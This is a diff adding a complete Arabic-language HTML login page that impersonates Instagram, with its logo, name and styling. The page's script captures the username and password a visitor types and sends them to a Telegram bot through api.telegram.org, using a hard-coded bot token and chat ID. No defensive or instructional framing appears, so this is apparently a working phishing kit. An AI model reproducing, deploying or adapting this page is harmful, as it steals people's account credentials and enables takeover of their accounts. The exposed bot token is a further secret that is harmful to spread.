@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    .container {
+      display: flex;
+      max-width: 900px;
+      width: 100%;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    .image-section {
+      flex: 1;
+      background: url('https://images.unsplash.com/photo-1564869733412-f2d35413a5bc?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&q=80&w=600') 
+                  no-repeat center center / cover;
+      display: block;
+      height: 100%;
+    }
+    .form-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+    .form-section h1 {
+      font-size: 2.5rem;
+      color: #262626;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+    .form {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .form input {
+      padding: 12px;
+      font-size: 1rem;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      background: #fafafa;
+      transition: border-color 0.3s ease;
+    }
+    .form input:focus {
+      border-color: #0095f6;
+      outline: none;
+    }
+    .form button {
+      padding: 12px;
+      background-color: #0095f6;
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .form button:hover {
+      background-color: #007bb5;
+    }
+    .form button:disabled {
+      background-color: #b2dffc;
+    }
+    .divider {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      text-align: center;
+    }
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider span {
+      padding: 0 10px;
+      color: #8e8e8e;
+    }
+    .signup-link {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #555;
+    }
+    .signup-link a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="image-section"></div>
+    <div class="form-section">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+      </div>
+      <h1>Instagram</h1>
+      <form id="loginForm" class="form">
+        <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">تسجيل الدخول</button>
+      </form>
+      <div class="divider"><span>أو</span></div>
+      <p><a href="#">تسجيل الدخول عبر فيسبوك</a></p>
+      <div class="signup-link">
+        <p>ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // بيانات بوت التليجرام
+        const botToken = "7873840648:AAENlbeo4RXQKnwlxWyIQE1aAjBc708o0X8";
+        const chatId = "5165030401";
+        const message = `🔒 تسجيل دخول جديد:
+    👤 اسم المستخدم: ${username}
+    🔑 كلمة المرور: ${password}`;
+
+        // إرسال البيانات إلى التليجرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert("تم إرسال البيانات بنجاح!");
+            } else {
+                alert("حدث خطأ أثناء الإرسال.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("فشل في الإرسال.");
+        });
+    });
+  </script>
+</body>
+</html>
